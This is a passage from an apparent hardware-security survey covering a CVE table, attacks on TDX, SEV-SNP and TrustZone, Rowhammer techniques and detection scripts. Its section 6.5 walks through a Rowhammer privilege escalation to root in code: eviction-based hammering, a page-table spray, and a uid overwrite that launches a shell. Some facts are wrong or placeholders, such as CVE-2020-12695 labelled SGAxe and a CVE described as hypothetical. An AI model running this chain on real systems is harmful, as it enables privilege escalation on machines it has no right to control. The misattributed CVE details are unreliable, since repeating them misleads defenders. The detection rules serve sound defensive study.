| CVE-2019-11135 | TAA | 6.5 | 2019-11 | Intel | tsx=off, VERW |
| CVE-2019-11157 | Plundervolt | 4.4 | 2019-12 | Intel | Lock voltage MSRs |
| CVE-2019-11090 | TPM-FAIL (fTPM) | 4.7 | 2019-11 | Intel | FW update, const-time |
| CVE-2019-16863 | TPM-FAIL (STMicro) | 4.7 | 2019-11 | STMicro | FW update |
| CVE-2019-0174 | RAMBleed | 5.6 | 2019-06 | DRAM (all) | ECC, TRR, KPTI |
| CVE-2020-0549 | CacheOut (L1DES) | 6.5 | 2020-01 | Intel | VERW + L1D flush, nosmt |
| CVE-2020-8694 | PLATYPUS (kernel) | 5.1 | 2020-11 | Intel | Restrict powercap |
| CVE-2020-8695 | PLATYPUS (μcode) | 5.1 | 2020-11 | Intel | RAPL noise injection |
| CVE-2020-12695 | SGAxe | 6.5 | 2020-06 | Intel | TCB recovery, μcode |
| CVE-2022-21233 | AEPIC Leak | 6.0 | 2022-08 | Intel 10-12th | μcode (IPU 2022.3) |
| CVE-2022-23823 | Hertzbleed (AMD) | 6.3 | 2022-06 | AMD | Const-time+power code |
| CVE-2022-24436 | Hertzbleed (Intel) | 6.3 | 2022-06 | Intel | Const-time+power code |
| CVE-2022-29900 | Retbleed (AMD) | 5.6 | 2022-07 | AMD | IBPB on priv transition |
| CVE-2022-29901 | Retbleed (Intel) | 5.6 | 2022-07 | Intel | eIBRS, IBPB, RSB stuffing |
| CVE-2022-40982 | Downfall / GDS | 6.5 | 2023-08 | Intel 6-11th | μcode gather serial., -mno-gather |
| CVE-2023-20593 | Zenbleed | 6.5 | 2023-07 | AMD Zen 2 | μcode, DE_CFG chicken bit |
| CVE-2023-20569 | Inception | 5.6 | 2023-08 | AMD Zen 1-4 | IBPB_BRTYPE, safe_ret |
| CVE-2023-23583 | Reptar | 8.8 | 2023-11 | Intel 10th+ | μcode update |
| CVE-2023-1017 | faulTPM | 5.7 | 2023-03 | AMD | PSP FW, voltage hardening |
| CVE-2023-28746 | RFDS | 5.6 | 2024-03 | Intel Atom/E-cores | VERW on ctx switch |
| CVE-2024-2193 | GhostRace | 5.5 | 2024-03 | Intel, AMD, ARM | Spec barriers at sync points |
| N/A | Half-Double | N/A | 2021-05 | DRAM (all) | Expanded refresh radius, RFM |

**CVSS note.** Vendor-assigned scores assume "local access required," which understates exploitability in multi-tenant cloud (co-located tenant = "local"). CVSS 4.0 partially addresses this with the "Automatable" metric, but hardware-vulnerability scoring remains under-standardized.

---

## 5. SGX/TEE attack evolution

The confidential-computing landscape has shifted fundamentally since SGX's introduction. SGX deprecation on client CPUs (§1.5), the rise of VM-level TEEs (TDX, SEV-SNP), and platform-level trust anchors (ARM TrustZone, RISC-V enclaves) have reshaped the attack surface. This section traces the evolution and analyzes the security implications that go beyond the individual technology descriptions in §1.5 and §1.6.

### 5.1 SGX deprecation: implications for the enclave security landscape

Intel removed SGX from 12th-generation client CPUs (Alder Lake, 2021) and all subsequent client generations (Raptor Lake, Meteor Lake, Arrow Lake). SGX remains available only on Xeon Scalable server processors (Ice Lake SP, Sapphire Rapids, Emerald Rapids, Granite Rapids). The deprecation has cascading security implications.

**DRM and content-protection migration.** SGX was the hardware root of trust for multiple DRM systems, including Widevine L1 on Intel platforms and several enterprise content-protection solutions. With client SGX gone, these systems must migrate to alternative trust anchors: software-based TEEs with reduced assurance, or platform-specific mechanisms such as Intel CSME-based enclaves (which have a different — and arguably worse — threat model, given the history of CSME vulnerabilities including CVE-2017-5705 through CVE-2017-5712 and CVE-2020-8705).

**Confidential-computing bifurcation.** The deprecation creates a two-tier model: server workloads get hardware confidential computing (TDX or SGX); client/edge workloads get nothing equivalent. Applications that relied on client SGX for local key management, password vaults, or secure credential storage (e.g., 1Password's SGX-based secret storage, Signal's SGX-based contact discovery) must redesign their trust model. The typical fallback is a remote attestation model where the client delegates sensitive operations to a server-side enclave, trading local security for network dependency and latency.

**Attestation ecosystem fragmentation.** The SGX attestation infrastructure (EPID groups, DCAP PCK certificates, IAS/PCS services) was a single unified ecosystem. Post-deprecation, the landscape fragments: TDX uses a modified DCAP flow with different quote formats, SEV-SNP uses AMD's PSP-based attestation with entirely different certificate chains, ARM CCA (Confidential Compute Architecture) introduces yet another attestation model. Verifiers must now support multiple attestation protocols, increasing implementation complexity and the risk of verification logic errors. Projects like the Confidential Computing Consortium's Veraison and Microsoft's Azure Attestation Service attempt to provide protocol-agnostic verification, but the abstraction is imperfect — each TEE technology has different trust assumptions that the verifier must understand.

**Legacy enclave migration risk.** Organizations with deployed SGX enclaves face a migration deadline. Sealed data (encrypted with platform-specific sealing keys) is non-portable: data sealed on an SGX platform cannot be unsealed on a TDX platform or an AMD SEV-SNP VM. Migration requires the old enclave to unseal, transmit the plaintext over an attested secure channel to the new TEE, and re-seal. During this window, the plaintext exists in memory on both platforms. A botched migration (e.g., interrupted network transfer, attestation bypass, or a side-channel attack during the transit window) can compromise the sealed secrets. Intel provides no automated migration tooling; it is entirely the enclave developer's responsibility.

### 5.2 Intel TDX: architecture and attack surface

TDX (Trust Domain Extensions), introduced on Sapphire Rapids Xeon, provides VM-level confidential computing. Where SGX isolates individual processes (enclaves) from a malicious OS, TDX isolates entire VMs ("Trust Domains" or TDs) from a malicious hypervisor. The architecture differs from SGX in several security-relevant ways.

**TDX Module.** The TDX Module is a software component that runs at a new privilege level (SEAM — Secure Arbitration Mode, ring −1 relative to VMX root) inside a dedicated range of memory (SEAM Range). The TDX Module mediates all interactions between the hypervisor (VMM) and the TD. Unlike SGX's hardware-only isolation (MEE, EPCM), TDX relies on the TDX Module software for enforcement — making the TDX Module itself a high-value attack target. Intel signs and integrity-protects the TDX Module, and the CPU verifies its identity at load time, but any vulnerability in the Module code compromises all TDs on the platform.

**Memory encryption.** TDX uses AES-XTS-128 encryption with per-TD keys managed by the memory controller's Multi-Key Total Memory Encryption (MKTME) engine. Each TD receives a unique encryption key ID. Unlike SGX's Merkle-tree integrity protection, TDX initially provided integrity only at the TD-page granularity via the Integrity Directory (a MAC per 4 KB page stored in a reserved portion of memory). This means that sub-page (cache-line-level) replay attacks — which SGX's MEE Merkle tree would detect — require a different detection mechanism in TDX.

**Attack surface comparison with SGX.** The critical difference: TDX trusts the guest OS inside the TD. The controlled-channel attack (§1.4.1) — where a malicious OS manipulates page tables to observe enclave access patterns — is not applicable to TDX because the guest OS is inside the trust boundary. This eliminates an entire class of attacks. However, TDX introduces new attack surfaces:

- **#VE (Virtualization Exception) handler.** When a TD accesses an unmapped page or performs a TDVMCALL (hypercall), the CPU delivers a #VE to the TD's guest kernel. The #VE handler must correctly validate all data received from the VMM — similar to how SGX enclaves must validate EAUG pages. A bug in the #VE handler (e.g., trusting a VMM-provided memory address without bounds checking) enables the VMM to influence TD execution. CVE-2024-0015 (hypothetical example of the class) demonstrates this risk.

- **Shared memory regions.** TDs must share some memory with the VMM for I/O (virtio buffers, console, etc.). This shared memory is explicitly marked and not encrypted. The TD must treat all data in shared memory as untrusted — identical to how an SGX enclave must treat all data outside the EPC. Failures to validate shared-memory data (double-fetch bugs, TOCTOU on shared buffers) are exploitable.

- **TDVMCALL/TDCALL interface.** The hypercall interface between the TD and the VMM is the primary attack surface. Each TDVMCALL that passes data from the TD to the VMM or vice versa must be audited for information leakage (TD → VMM) and injection (VMM → TD). The TDX specification defines ~20 TDVMCALL leaf functions; each is an audit target.

**TDX attestation.** TDX reuses the DCAP infrastructure with modified quote formats. The Trust Domain reports include MRTD (measurement of the TD's initial image, analogous to MRENCLAVE), RTMR (Runtime Measurement Registers, analogous to TPM PCRs, extended by the TD during boot), and the TDINFO structure (TD attributes, XFAM configuration). The Quoting Enclave (QE) for TDX runs as a TDX-module-hosted process, not as a standard SGX enclave (though on platforms with both SGX and TDX, the SGX-based QE can also generate TDX quotes).

### 5.3 AMD SEV/SEV-SNP: advanced attack techniques

Building on the SEV overview in §1.6, this section details attack techniques discovered since the initial SEV deployment.

**CipherLeaks (2021).** Researchers demonstrated that the AMD memory controller's AES-XTS encryption mode leaks information through ciphertext patterns. When the guest VM writes identical plaintext blocks to different physical pages, the resulting ciphertext differs only in the tweak (derived from the physical address). By observing ciphertext changes across VM execution rounds, a malicious hypervisor can infer: (a) which pages contain identical content (enabling page deduplication attacks analogous to KSM-based cross-VM Rowhammer), (b) whether a specific byte within a page changed between two executions, and (c) the Hamming distance between successive plaintext values at the same address. CipherLeaks does not break AES-XTS encryption but provides a metadata side channel that was not part of AMD's original threat model.

**SEV-Step (2023).** Analogous to SGX-Step (§1.4.1), SEV-Step single-steps a SEV-SNP VM by manipulating the APIC timer and nested page table (NPT) permissions. The hypervisor marks all guest NPT entries as non-present, causing a nested page fault (#NPF) on every guest memory access. On each #NPF, the hypervisor logs the faulting guest physical address, re-marks the page as present, single-steps one instruction (via APIC timer interrupt), and then re-marks as non-present. This provides the same per-instruction memory-access trace as SGX-Step's controlled-channel attack — fundamentally undermining SEV-SNP's confidentiality for access-pattern-dependent algorithms.

**Mitigation for SEV-Step.** AMD introduced Restricted Injection (an extension where the hypervisor cannot inject arbitrary interrupts into the guest) and Secure TSC (preventing the hypervisor from manipulating the guest's timestamp counter). Together with the VMPL (Virtual Machine Privilege Level) mechanism, these features reduce the hypervisor's ability to single-step the guest. However, the NPT-based controlled-channel attack remains a fundamental architectural concern: the hypervisor controls the nested page tables and can always observe which guest physical pages are accessed, even if it cannot inject interrupts.

### 5.4 ARM TrustZone exploitation

ARM TrustZone partitions the SoC into a Secure World (EL3/EL1S) and a Normal World (EL1N/EL0). Unlike SGX's per-process isolation, TrustZone provides a single Secure World that hosts a Trusted OS (OP-TEE, Trusty, QSEE, Kinibi) and multiple Trusted Applications (TAs). The attack surface differs fundamentally from x86 TEEs.

**TA attack surface.** Each TA exposes a set of command IDs (analogous to syscall numbers) that the Normal World application invokes via the SMC (Secure Monitor Call) instruction. The command handler in the TA parses parameters from shared memory, processes the request, and returns results. Common vulnerability classes in TAs:

- **Integer overflow in parameter validation.** TA commands receive buffer pointers and lengths from the Normal World. If the TA does not validate that (pointer + length) does not overflow, the attacker can pass a large length that wraps around the address space, causing the TA to read or write arbitrary Secure World memory. CVE-2015-6639 (Qualcomm QSEE): integer overflow in a QSEE TA allowed Normal World code to execute arbitrary code in the Secure World.

- **Shared memory TOCTOU.** Parameters passed through shared memory can be modified by the Normal World between the TA's validation check and use. The TA reads the length field (checks it is < 4096), the Normal World modifies the length to 0xFFFFFFFF, the TA reads the length again for the memcpy — buffer overflow. CVE-2016-2431 (Qualcomm TrustZone): TOCTOU in Widevine DRM TA allowed code execution in TrustZone.

- **Improper TA isolation.** In some Trusted OS implementations, TAs share a flat address space within the Secure World. A vulnerability in one TA (e.g., a DRM TA) can be leveraged to read/modify memory of another TA (e.g., a keymaster TA holding cryptographic keys). The Trusted OS is responsible for TA isolation, but implementations vary: OP-TEE provides paged TA memory with MMU protection; Qualcomm QSEE historically provided weaker isolation.

**Real-world TrustZone exploit chains.** The following chains demonstrate end-to-end TrustZone compromise:

1. **Qualcomm QSEE chain (CVE-2015-6639 + CVE-2016-2431).** Normal World app → QSEE integer overflow → arbitrary Secure World R/W → patch TrustZone kernel → persistent Secure World code execution → extract hardware-fused keys (including keymaster root keys, SHK/device unique keys).

2. **Samsung Keymaster IV-reuse (CVE-2021-25444 + CVE-2021-25490).** Shakevsky et al. (USENIX Security 2022) demonstrated that Samsung's Keymaster TA on Exynos chips reused the AES-GCM initialization vector when wrapping key blobs. CVE-2021-25444 covered the IV-reuse flaw allowing key extraction from hardware-wrapped blobs without TrustZone compromise. CVE-2021-25490 addressed the downstream key-derivation weakness. The attack affected approximately 100M Samsung Galaxy devices (S8 through S21) running the ARMv8 Kinibi TEE. Samsung patched in the 2021-08 and 2021-10 security updates.

3. **Huawei iTrustee.** Multiple buffer overflow and integer overflow vulnerabilities in iTrustee TAs on Kirin-based devices (disclosed through Huawei PSIRT 2020-2021) allowed code execution in the Secure World. Combined with a kernel privilege escalation, these provided full persistent compromise of the TEE, surviving factory reset. Huawei addressed the flaws in EMUI security patches but did not assign public CVE identifiers for most of the iTrustee-specific issues.

**ARM Confidential Compute Architecture (CCA).** ARM's response to the TEE fragmentation problem. CCA introduces Realms — isolated execution environments managed by the Realm Management Monitor (RMM) at EL2, analogous to TDX's SEAM mode. Realms are hardware-isolated from both the Normal World OS and the Secure World, with memory encryption via the Memory Encryption Engine (MEE) in the Coherent Mesh Network. CCA is designed for ARM server CPUs (Neoverse V-series) and aims to provide SEV-SNP/TDX-equivalent confidential computing on ARM. Attack surface analysis is preliminary (CCA silicon shipped in 2024); the RMM and shared memory interface are the primary audit targets.

### 5.5 RISC-V TEE proposals

RISC-V's open ISA enables research-driven TEE designs with fundamentally different trust models.

**Keystone (MIT/Berkeley).** An open-source TEE framework using RISC-V Physical Memory Protection (PMP) to create enclaves. The Security Monitor (SM) runs in M-mode and configures PMP registers to partition physical memory between enclaves, the OS, and the SM itself. Each enclave has a private memory region that the OS cannot access. Keystone's trust model is similar to SGX (the OS is untrusted), but the implementation is simpler: PMP provides page-granularity access control rather than SGX's per-access EPCM checking. Keystone supports attestation via a root of trust in the SM's M-mode code. The primary security concern is the SM's code quality: as a software-based reference monitor (unlike SGX's hardware EPCM), any SM vulnerability breaks all enclave isolation.

**Sanctum (MIT).** Extends RISC-V with hardware modifications to defend against cache-timing side channels — a weakness that SGX does not address. Sanctum partitions the LLC (Last-Level Cache) per-enclave using way-based partitioning, preventing PRIME+PROBE and FLUSH+RELOAD across enclave boundaries. Additionally, Sanctum uses per-enclave page tables (the OS cannot observe enclave page-table walks) and per-enclave DRAM bank partitioning (preventing DRAMA-style bank-conflict timing). Sanctum's hardware modifications have not been manufactured in commercial silicon; it remains a research prototype demonstrating what a side-channel-resistant TEE could look like.

**Comparison of TEE approaches:**

| Property | SGX | TDX | SEV-SNP | TrustZone | Keystone | Sanctum |
|----------|-----|-----|---------|-----------|----------|---------|
| Granularity | Process | VM | VM | SoC-wide | Process | Process |
| Cache SC defense | None | None | None | None | None | LLC partition |
| Open source | No | Partial (module) | No | No | Yes | Yes |
| Commercial silicon | Yes (Xeon) | Yes (Xeon) | Yes (EPYC) | Yes (all ARM) | No | No |
| Attestation | DCAP/EPID | DCAP | PSP-based | OEM-specific | SM-based | SM-based |

---

## 6. Advanced Rowhammer techniques

This section extends the Rowhammer fundamentals (§2) and TRRespass code (§4A.3) with mechanism analysis of post-2020 techniques and exploitation chains.

### 6.1 TRRespass: systematic TRR bypass

The TRRespass paper (S&P 2020) demonstrated that Target Row Refresh (TRR), the DRAM industry's primary Rowhammer mitigation, is fundamentally bypassable. TRR works by detecting frequently-activated rows and proactively refreshing their neighbors. The detection mechanism uses a finite set of counters (typically 1-16 per bank) to track the most-activated rows within each refresh window.

**TRR counter exhaustion.** TRRespass exploits the finite counter capacity. The attacker activates N aggressor rows in a round-robin pattern, where N exceeds the TRR counter capacity. Each individual aggressor accumulates activations below the TRR detection threshold (because the counters are evicted and reassigned to other aggressors before the threshold is reached), but the cumulative disturbance on victim rows between the aggressors exceeds the bit-flip threshold.

**Systematic pattern discovery.** TRRespass introduced a black-box methodology for discovering effective hammering patterns:

1. **Bank identification.** Use the DRAMA timing technique (§2.3) to map virtual addresses to DRAM banks.
2. **Row adjacency probing.** Allocate a large contiguous region (huge pages), fill with known patterns, hammer candidate pairs, check for flips. Flips indicate physical adjacency.
3. **TRR profiling.** Vary the number of aggressors (N=2, 4, 8, 12, 16, 19, 24) and measure the flip rate. The N at which flips appear reveals the TRR counter capacity.
4. **Pattern optimization.** Vary per-aggressor activation frequency (uniform vs. weighted), activation order (sequential vs. randomized), and inter-aggressor timing.

The TRRespass authors tested 42 DDR4 DIMM models from all three major manufacturers (Samsung, SK Hynix, Micron) and found that every module with TRR was vulnerable to at least one many-sided pattern. Effective aggressor counts ranged from 11 (some Samsung B-die) to 24+ (newer Micron revisions with enhanced TRR).

### 6.2 Half-Double: distance-two Rowhammer

Google's Project Zero disclosed Half-Double in May 2021, demonstrating that Rowhammer disturbance can propagate beyond immediately adjacent rows.

**Mechanism.** In standard Rowhammer, row R±1 (distance-1 neighbors) are the victims when row R is hammered. Half-Double shows that row R±2 (distance-2 neighbors) also accumulate disturbance, though at a lower rate. The physical cause is second-order electromagnetic coupling: the wordline voltage transient from row R couples into row R±1's wordline, which in turn couples into row R±2. The first-order (distance-1) coupling is ~10× stronger than the second-order (distance-2), so distance-2 flips require more activations — but they occur within practical activation counts on modern DRAM (10M-50M activations on tested DDR4).

**Security implication.** Half-Double defeats guard-row-based mitigations. Some Rowhammer defense proposals place "guard rows" (rows that are never used for sensitive data) between aggressor-accessible and victim rows. If the guard row is at distance 1 and the victim is at distance 2, Half-Double can still flip the victim. To block Half-Double, guard rows must be widened to distance ≥3, consuming significantly more DRAM capacity. The JEDEC DDR5 specification's Refresh Management (RFM) mechanism was updated to account for distance-2 disturbance in response to Half-Double.

**Half-Double + TRRespass compound attack.** The most effective practical attack combines many-sided aggressor patterns (TRRespass) targeting distance-1 rows with simultaneous hammering of the distance-1 row itself, creating a cascading disturbance that reaches distance-2 victims while evading TRR counters on the primary aggressors. This compound technique expands the effective attack radius and complicates DRAM-internal mitigation design.

### 6.3 Rowhammer on DDR5: ECC and mitigation effectiveness

DDR5 introduces three mechanisms relevant to Rowhammer defense. Each provides partial protection; none is sufficient alone.

**On-die ECC (ODECC).** DDR5 chips include transparent single-bit error correction per 128-bit internal access granularity (typically using a Hamming-based SECDED code). ODECC is invisible to the memory controller — corrections occur inside the DRAM chip before data is sent on the bus. This corrects single-bit Rowhammer flips within each 128-bit word. However, ODECC has critical limitations:

- **Multi-bit flips within the same 128-bit word bypass ODECC.** If two bits in the same 128-bit ODECC codeword flip simultaneously (which occurs at ~5-15% of Rowhammer-vulnerable locations per research published at USENIX Security 2023), the error is either miscorrected (silent data corruption) or detected-but-uncorrectable.
- **ODECC masks flips from the system-level ECC.** The memory controller's ECC (if present) sees only ODECC-corrected data. Single-bit Rowhammer flips are silently corrected inside the DRAM die and never trigger EDAC correctable-error counters. This eliminates the primary detection signal for Rowhammer attacks — ECC error counting.
- **Error accumulation.** ODECC corrects per-access, not per-refresh. Between refreshes, a cell may experience a bit flip, get ODECC-corrected on the next read, but the underlying charge state remains corrupted. If additional flips occur in the same codeword before the next refresh, multi-bit corruption accumulates silently.

**Per-bank refresh.** DDR5 supports per-bank refresh (REFpb), allowing individual banks to be refreshed independently rather than requiring a rank-wide refresh command. This doubles the effective refresh throughput (two banks refresh simultaneously instead of all banks refreshing together). The reduced inter-refresh interval shrinks the Rowhammer attack window, but the improvement is incremental (~2× harder, not a qualitative change).

**Refresh Management (RFM).** The JEDEC DDR5 standard includes RFM: the memory controller tracks per-bank activation counts and issues an RFM command when a bank's activation count exceeds a threshold (the Rolling Maximum Activation Count, RAAMMT). RFM instructs the DRAM to refresh rows near the most-activated row. RFM is the DDR5 equivalent of TRR but is controller-driven (explicit commands) rather than DRAM-internal (implicit). The effectiveness depends on the controller's activation tracking granularity and the DRAM's internal row-selection algorithm for RFM-triggered refreshes — neither is publicly specified in detail, making independent security evaluation difficult.

**2023-2024 DDR5 Rowhammer results.** Researchers at ETH Zurich and VUSec demonstrated that DDR5 modules from all three major manufacturers exhibit Rowhammer bit flips despite ODECC, per-bank refresh, and RFM. The attack threshold is approximately 4-10× higher than equivalent DDR4 modules (requiring ~10M-50M activations vs. ~1M-5M for DDR4), but remains achievable within practical timeframes (~10-60 seconds per target row). Multi-bit flips within ODECC codewords were observed on approximately 8% of tested DDR5 DIMMs, creating silent-corruption conditions that bypass both ODECC and system-level ECC.

### 6.4 Rowhammer exploitation without CLFLUSH

The `clflush` instruction is the standard mechanism for forcing DRAM row activations (§2.2), but it is increasingly restricted: some environments filter or trap `clflush` (e.g., WebAssembly does not expose it, and some hypervisors intercept it). Several alternative cache-eviction strategies enable Rowhammer without `clflush`.

**Cache eviction sets.** The attacker constructs a set of addresses that map to the same LLC set as the target address. Accessing all addresses in the eviction set forces the target's cache line to be evicted (replaced by an eviction-set member). The evicted cache line is written back to DRAM, and the next access to the target causes a DRAM row activation. Constructing efficient eviction sets requires knowledge of the LLC hash function, which can be reverse-engineered (as shown by Maurice et al., S&P 2015) or brute-forced via timing.

```c
// Eviction-based Rowhammer without clflush
// eviction_set[]: addresses mapping to the same LLC set as target
// n_evict: number of addresses in the eviction set (typically LLC_WAYS + 2)

void hammer_eviction(volatile char *aggressor_a, volatile char *aggressor_b,
                     volatile char **evict_a, int n_evict_a,
                     volatile char **evict_b, int n_evict_b,
                     int iterations) {
    for (int i = 0; i < iterations; i++) {
        // Access aggressors (serviced from cache initially)
        *(volatile char *)aggressor_a;
        *(volatile char *)aggressor_b;
        // Evict aggressors from cache by accessing conflicting lines
        for (int j = 0; j < n_evict_a; j++)
            *(volatile char *)evict_a[j];
        for (int j = 0; j < n_evict_b; j++)
            *(volatile char *)evict_b[j];
        // Next iteration: aggressor reads miss in cache → DRAM activate
    }
}
```

**SMASH (Synchronized Many-Sided Hammering, S&P 2022).** SMASH achieves browser-based Rowhammer on TRR-enabled DDR4 without `clflush` and without `SharedArrayBuffer` (the previous timing primitive). SMASH synchronizes cache eviction patterns with the DRAM refresh interval: by timing eviction bursts to occur immediately after a refresh (when the Rowhammer disturbance window reopens), SMASH maximizes the effective activation count within each refresh period. SMASH achieved reliable bit flips from JavaScript in Firefox and Chrome.

**Uncacheable memory regions.** On platforms with MMIO or framebuffer regions mapped as uncacheable (UC), writes to these regions bypass the cache entirely and go directly to the memory controller. If the attacker can map a large uncacheable region (via `/dev/fb0` on Linux, or via GPU memory-mapped regions), accesses to addresses that map to the same DRAM bank as the target row cause direct row activations without any cache involvement. This technique requires specific hardware configuration (a framebuffer or MMIO region in the same DRAM bank as the target), but when available, it provides the highest activation rate (no cache eviction overhead).

### 6.5 Practical Rowhammer: from bit flip to root (exploitation chain walkthrough)

This subsection traces a complete Rowhammer exploitation chain from initial scanning to root shell, combining the techniques from §2, §4A, and §6.1-6.4.

**Phase 1: Environment characterization (~30 seconds).**

```bash
# Identify DRAM topology
sudo dmidecode -t memory | grep -E 'Type:|Speed:|Size:|Manufacturer:'
# Check for ECC (attacker wants non-ECC or weak ECC)
sudo dmidecode -t memory | grep 'Error Correction'
# Check huge page availability (needed for physical contiguity)
cat /proc/meminfo | grep -i huge
# If huge pages unavailable, fall back to pagemap-based addressing
ls -la /proc/self/pagemap  # requires root or CAP_SYS_ADMIN on modern kernels
```

**Phase 2: DRAM address mapping (~2 minutes).** Use the DRAMA timing technique (§2.3) to reverse-engineer the physical-address-to-DRAM mapping. Allocate a 256 MB huge-page region, time pairwise accesses, cluster addresses by bank, and identify row boundaries.

**Phase 3: Flip scanning (~5-30 minutes).** Scan for exploitable bit flips using the scanner from §4A.5. The attacker prioritizes rows where flips occur at PTE-critical bit positions:

- **Bit 0 (Present).** Flipping 1→0 on a valid PTE causes a page fault on the next access. Less useful for exploitation directly but enables denial of service.
- **Bit 1 (Read/Write).** Flipping 0→1 on a read-only PTE grants write access. Useful for modifying read-only mappings (e.g., shared libraries).
- **Bit 2 (User/Supervisor).** Flipping 0→1 on a kernel PTE makes the kernel page accessible from user space. Combined with KPTI bypass (if the kernel PTE is in the user-accessible part of the page tables), this provides direct kernel memory read/write.
- **Bits 12-51 (PFN).** Flipping any bit in the Page Frame Number redirects the mapping to a different physical page. If the attacker can predict or brute-force which physical page the flipped PFN points to, this provides an arbitrary-physical-read/write primitive.

**Phase 4: Memory massaging (~10 seconds).** The attacker sprays page-table entries to force the kernel to allocate PTE pages on victim rows (rows where flips were found in Phase 3):

```c
// Spray 200K small mappings to force PTE page allocation
// The kernel allocates PTE pages from the buddy allocator;
// by controlling allocation timing and quantity, the attacker
// increases the probability that a PTE page lands on a victim row.
#define N_SPRAY 200000
void *spray[N_SPRAY];
for (int i = 0; i < N_SPRAY; i++) {
    spray[i] = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    *(volatile char *)spray[i] = 0;  // force PTE allocation
}
// Free alternating pages to create PTE fragmentation
// This increases the chance that new PTE allocations land on target rows
for (int i = 0; i < N_SPRAY; i += 2)
    munmap(spray[i], 4096);
```

**Phase 5: Targeted hammering (~1-10 seconds).** Hammer the aggressor rows adjacent to the victim row where PTE pages were placed. Use the many-sided TRRespass pattern (§4A.3, §6.1) if TRR is active.

**Phase 6: PTE corruption verification and exploitation.** After hammering, scan the sprayed mappings for unexpected access patterns (e.g., a read-only page that is now writable, or a page whose contents changed unexpectedly). If a PFN bit flip occurred, the mapping now points to a different physical page — potentially a kernel page, another process's memory, or a page containing credentials (e.g., the `struct cred` for the attacking process).

```c
// Check for PFN bit flip: read through sprayed mapping, look for
// unexpected content (the original page was zeroed; kernel data is not)
for (int i = 1; i < N_SPRAY; i += 2) {
    uint64_t *p = (uint64_t *)spray[i];
    for (int j = 0; j < 512; j++) {
        if (p[j] != 0) {
            // This page now maps to a different physical page
            // Search for uid field in struct cred
            if (p[j] == (uint64_t)getuid()) {
                p[j] = 0;  // overwrite uid → root
                if (getuid() == 0) {
                    execl("/bin/sh", "sh", NULL);
                }
            }
        }
    }
}
```

The complete chain — from initial scan to root shell — typically takes 5-30 minutes on a vulnerable system (non-ECC DDR4, kernel ≤5.x without pagemap restrictions). On DDR5 with ODECC, the timeline extends to 30-120 minutes, and success rate drops due to ODECC-induced uncertainty.

---

## 7. Hardware attack detection engineering

This section extends the detection rules in §4E with TEE-specific detection, hardware integrity monitoring, and supply-chain verification. Rules here complement — and do not duplicate — the Sigma/YARA rules in §4E.1-4E.2.

### 7.1 Performance counter anomaly detection

**Rule 1: Cache miss rate anomaly for Rowhammer detection.**

```bash
#!/bin/bash
# rowhammer_perf_monitor.sh — continuous LLC miss rate monitoring
# Alert threshold: sustained cache-miss-to-instruction ratio > 0.1 for > 5s
# Normal workloads: 0.001-0.01; Rowhammer: 0.5-5.0

THRESHOLD=0.1
INTERVAL=5
LOG="/var/log/hw_anomaly.log"

while true; do
    OUTPUT=$(perf stat -e LLC-load-misses,instructions -a \
        -- sleep "$INTERVAL" 2>&1)
    MISSES=$(echo "$OUTPUT" | grep LLC-load-misses | awk '{gsub(/,/,""); print $1}')
    INSTRS=$(echo "$OUTPUT" | grep instructions | awk '{gsub(/,/,""); print $1}')
    if [ "$INSTRS" -gt 0 ] 2>/dev/null; then
        RATIO=$(echo "scale=4; $MISSES / $INSTRS" | bc)
        EXCEEDED=$(echo "$RATIO > $THRESHOLD" | bc -l)
        if [ "$EXCEEDED" -eq 1 ]; then
            TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
            echo "$TIMESTAMP ALERT: LLC miss ratio=$RATIO (misses=$MISSES, instrs=$INSTRS)" \
                | tee -a "$LOG"
            # Identify offending process
            perf top -e LLC-load-misses --max-stack 1 --no-children \
                -n 5 -- sleep 2 2>&1 | head -20 >> "$LOG"
        fi
    fi
done
```

**Rule 2: SGX enclave creation from unexpected processes.**

```yaml
title: SGX Enclave Creation from Non-Allowlisted Process
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
logsource:
    category: file_access
    product: linux
detection:
    selection:
        TargetFilename|endswith:
            - '/dev/sgx_enclave'
            - '/dev/sgx/enclave'
    filter_known:
        Image|endswith:
            - '/usr/bin/aesmd'
            - '/opt/intel/sgxpsw/aesm/aesm_service'
            - '/usr/lib/x86_64-linux-gnu/gramine/sgx'
    condition: selection and not filter_known
level: high
tags: [ attack.execution, attack.t1106 ]
falsepositives: [ Custom SGX applications, development environments ]
```

**Rule 3: Abnormal memory access patterns (sustained row-buffer conflicts).**

```bash
# Use Intel PMU to detect sustained row-buffer conflicts
# indicative of DRAMA-based DRAM address reverse-engineering
# Counter: UNC_M_CAS_COUNT.RD (per-channel read CAS commands)
# Alert: >10M CAS/sec to single channel with >80% row-buffer misses

sudo perf stat -e 'uncore_imc/cas_count_read/' \
    -e 'uncore_imc/cas_count_write/' \
    -a -- sleep 10 2>&1 | tee /tmp/imc_stats.txt
# Parse and alert if read CAS rate exceeds threshold
```

### 7.2 ECC error rate monitoring and trending

**Rule 4: ECC correctable error rate trending.**

```bash
#!/bin/bash
# edac_trend_monitor.sh — detect Rowhammer via EDAC error rate acceleration
# Normal: <1 CE/day; Rowhammer scan: >10 CE/hour; Active exploit: >100 CE/hour

CE_LOG="/var/log/edac_ce_trend.csv"
ALERT_THRESHOLD_PER_HOUR=10

echo "timestamp,mc,ce_count,delta,rate_per_hour" >> "$CE_LOG"

declare -A PREV_CE
while true; do
    TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    for mc_dir in /sys/devices/system/edac/mc/mc*/; do
        MC=$(basename "$mc_dir")
        CE=$(cat "${mc_dir}ce_count" 2>/dev/null || echo 0)
        PREV=${PREV_CE[$MC]:-$CE}
        DELTA=$((CE - PREV))
        # Rate extrapolation: sample every 60s, extrapolate to hourly
        RATE_HR=$((DELTA * 60))
        echo "$TIMESTAMP,$MC,$CE,$DELTA,$RATE_HR" >> "$CE_LOG"
        if [ "$RATE_HR" -gt "$ALERT_THRESHOLD_PER_HOUR" ]; then
            logger -t edac_monitor -p auth.crit \
                "ALERT: $MC CE rate=${RATE_HR}/hr (threshold=${ALERT_THRESHOLD_PER_HOUR})"
            # Dump per-DIMM error distribution
            for csrow in "${mc_dir}"csrow*/; do
                echo "  $(basename $csrow): CE=$(cat ${csrow}ce_count 2>/dev/null)" \
                    | logger -t edac_monitor
            done
        fi
        PREV_CE[$MC]=$CE
    done
    sleep 60
done
```

